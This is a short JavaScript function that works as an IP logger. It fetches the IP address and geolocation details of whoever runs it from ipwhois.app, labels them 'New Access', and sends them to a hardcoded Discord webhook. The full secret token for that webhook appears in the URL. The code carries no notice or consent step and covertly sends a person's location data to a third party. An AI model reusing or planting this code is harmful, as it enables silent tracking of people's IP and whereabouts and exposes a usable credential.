function req () {
  const get = {
    url:'https://ipwhois.app/json/',
    method:'GET'
  }
  axios(get).then(res => {
    var content = '```New Access: \n\n';
    function capitalize (str) {
      if(!str[0] || str.startsWith('https')) return str;
      else return str[0].toUpperCase()+str.slice(1,);
    }
    for (entry in res.data) {
      content+=capitalize(entry)+': '+capitalize(res.data[entry])+'\n'
    }
    content+='```';
    const post = {
      // hi pikkel :)
      url:'https://discord.com/api/webhooks/868713942929768459/9V_qvI_8QbsA-akLhwDIv8Xs0LJJZea3q-bgB7rq2hpU1eRx2YsTLVbxw4Eo8p9fkAWn',
      method:'POST',
      data:{
        "content":content,
      },
      headers:{
        'content-type':'application/json'
      }
    }
    axios(post);
  })
}
